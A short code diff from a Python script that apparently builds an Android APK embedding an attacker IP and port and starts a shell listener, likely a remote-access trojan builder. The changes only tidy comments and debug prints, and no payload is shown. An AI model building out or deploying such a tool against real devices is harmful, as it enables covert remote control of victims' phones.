@@ -27,31 +27,25 @@ parser.add_argument('-i','--ip',metavar="<IP>" ,required=True,type=str,help='Ent
 parser.add_argument('-p','--port',metavar="<Port>", type=str,required=True,help='Enter the Port')
 parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
 args = parser.parse_args()
-#print("arg ejemplo")
-#print(args)
 
 clear,direc = clearDirec()
 
-#print(clear)
-#print(direc)
-
+# Verifica que la ip sea valida
 if is_valid_ip(args.ip):
     ip = args.ip
 else:
     print(Fore.RED+"Not a valid IP"+Fore.RESET)
     sys.exit()
-
+# Verifica que el puerto es valido
 if is_valid_port(args.port):
     port = int(args.port)
 else:
     print(Fore.RED+"Not a valid Port"+Fore.RESET)
     sys.exit()
-
+# Inicia el shell
 if args.shell:
-    print("shell entro")
+    print("Inicia Server")
     create_workers()
     create_jobs()
-    #shell2(ip, port)
-    #server()
 if args.build:
     build(direc, port, ip, args)
